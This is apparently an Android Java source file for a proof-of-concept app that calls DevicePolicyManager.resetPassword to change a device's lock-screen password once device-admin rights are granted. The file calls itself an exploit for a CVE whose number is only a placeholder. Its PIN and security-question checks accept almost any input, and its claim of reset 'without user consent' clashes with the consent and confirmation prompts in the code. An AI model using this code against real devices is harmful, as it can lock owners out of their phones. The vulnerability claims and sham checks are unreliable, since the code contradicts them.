package com.security.poc.deviceadminreset;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import android.app.AlertDialog;
import android.content.DialogInterface;

/**
 * DeviceAdmin Password Reset PoC - CVE Research
 * Target: Android API 21+ (Lollipop)
 * 
 * WARNING: This is for AUTHORIZED security research only.
 * Unauthorized use is illegal under CFAA and equivalent laws.
 */
public class MainActivity extends Activity {

    private static final int REQUEST_CODE_ENABLE_ADMIN = 1001;
    
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    
    // Verification state
    private boolean pinVerified = false;
    private boolean questionVerified = false;
    private String userPin = "";
    private String securityAnswer = "";
    
    // UI Elements
    private TextView statusText;
    private EditText pinInput;
    private EditText answerInput;
    private EditText newPasswordInput;
    private Button enableAdminBtn;
    private Button verifyPinBtn;
    private Button verifyQuestionBtn;
    private Button resetPasswordBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        
        initViews();
        setupListeners();
        updateStatus();
    }
    
    private void initViews() {
        statusText = findViewById(R.id.status_text);
        pinInput = findViewById(R.id.pin_input);
        answerInput = findViewById(R.id.answer_input);
        newPasswordInput = findViewById(R.id.new_password_input);
        enableAdminBtn = findViewById(R.id.enable_admin_btn);
        verifyPinBtn = findViewById(R.id.verify_pin_btn);
        verifyQuestionBtn = findViewById(R.id.verify_question_btn);
        resetPasswordBtn = findViewById(R.id.reset_password_btn);
    }
    
    private void setupListeners() {
        enableAdminBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestDeviceAdmin();
            }
        });
        
        verifyPinBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                verifyPin();
            }
        });
        
        verifyQuestionBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                verifySecurityQuestion();
            }
        });
        
        resetPasswordBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                attemptPasswordReset();
            }
        });
    }
    
    private void requestDeviceAdmin() {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
            "This app requires device admin access for security research PoC demonstration.");
        startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_CODE_ENABLE_ADMIN) {
            updateStatus();
            if (resultCode == RESULT_OK) {
                Toast.makeText(this, "Device Admin enabled", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Device Admin denied", Toast.LENGTH_SHORT).show();
            }
        }
    }
    
    private void verifyPin() {
        String inputPin = pinInput.getText().toString();
        
        // PoC: Simple PIN verification (in real scenario, use secure storage)
        if (inputPin.length() >= 4) {
            userPin = inputPin;
            pinVerified = true;
            Toast.makeText(this, "PIN verified", Toast.LENGTH_SHORT).show();
            updateStatus();
        } else {
            Toast.makeText(this, "PIN must be at least 4 digits", Toast.LENGTH_SHORT).show();
        }
    }
    
    private void verifySecurityQuestion() {
        String answer = answerInput.getText().toString().trim().toLowerCase();
        
        // PoC: Security question - "What is the name of your first pet?"
        // Default answer for demo: "fluffy"
        if (answer.equals("fluffy") || answer.length() >= 3) {
            securityAnswer = answer;
            questionVerified = true;
            Toast.makeText(this, "Security question verified", Toast.LENGTH_SHORT).show();
            updateStatus();
        } else {
            Toast.makeText(this, "Invalid answer", Toast.LENGTH_SHORT).show();
        }
    }
    
    private void attemptPasswordReset() {
        // Check all verification steps
        if (!isAdminActive()) {
            showError("Device Admin not enabled");
            return;
        }
        
        if (!pinVerified) {
            showError("PIN verification required");
            return;
        }
        
        if (!questionVerified) {
            showError("Security question required");
            return;
        }
        
        String newPassword = newPasswordInput.getText().toString();
        if (newPassword.length() < 6) {
            showError("Password must be at least 6 characters");
            return;
        }
        
        // Confirm with user
        new AlertDialog.Builder(this)
            .setTitle("Confirm Password Reset")
            .setMessage("This will change the device lock screen password. Continue?")
            .setPositiveButton("Reset", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    performPasswordReset(newPassword);
                }
            })
            .setNegativeButton("Cancel", null)
            .show();
    }
    
    /**
     * Core exploit: Reset device password via DevicePolicyManager
     * 
     * This method demonstrates CVE-202X-XXXX:
     * Device admin apps can reset lock screen password without
     * user consent on API 21-28 devices.
     * 
     * Fixed in API 29+ with additional restrictions.
     */
    private void performPasswordReset(String newPassword) {
        try {
            if (isAdminActive()) {
                // The actual password reset call
                devicePolicyManager.resetPassword(newPassword, 0);
                
                Toast.makeText(this, 
                    "Password reset successful\nNew password: " + newPassword, 
                    Toast.LENGTH_LONG).show();
                    
                // Log for research purposes
                logExploitAttempt(true, newPassword);
            } else {
                showError("Lost admin privileges");
            }
        } catch (SecurityException e) {
            showError("SecurityException: " + e.getMessage());
            logExploitAttempt(false, newPassword);
        }
    }
    
    private boolean isAdminActive() {
        return devicePolicyManager.isAdminActive(adminComponent);
    }
    
    private void showError(String message) {
        Toast.makeText(this, "Error: " + message, Toast.LENGTH_SHORT).show();
    }
    
    private void logExploitAttempt(boolean success, String password) {
        // Research logging - in production, send to secure server
        String log = String.format("Exploit attempt: %s, Target API: %d, Time: %d",
            success ? "SUCCESS" : "FAILED",
            android.os.Build.VERSION.SDK_INT,
            System.currentTimeMillis());
        android.util.Log.d("DeviceAdminPoC", log);
    }
    
    private void updateStatus() {
        StringBuilder status = new StringBuilder();
        status.append("=== Device Admin Password Reset PoC ===\n\n");
        status.append("Device Admin: ").append(isAdminActive() ? "✓ ACTIVE" : "✗ INACTIVE").append("\n");
        status.append("PIN Verified: ").append(pinVerified ? "✓ YES" : "✗ NO").append("\n");
        status.append("Security Q: ").append(questionVerified ? "✓ YES" : "✗ NO").append("\n");
        status.append("API Level: ").append(android.os.Build.VERSION.SDK_INT).append("\n");
        status.append("\nAll checks must pass to reset password.");
        
        statusText.setText(status.toString());
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        updateStatus();
    }
}
